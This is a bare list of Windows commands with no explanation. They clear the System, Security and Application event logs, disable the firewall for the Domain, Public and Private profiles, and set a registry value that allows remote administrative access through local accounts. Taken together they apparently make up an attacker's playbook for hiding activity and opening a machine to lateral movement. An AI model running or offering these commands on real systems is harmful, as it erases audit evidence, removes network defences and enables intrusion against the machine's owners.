wevtutil cl System
wevtutil cl Security
wevtutil cl Application

Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled false

reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\system /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f

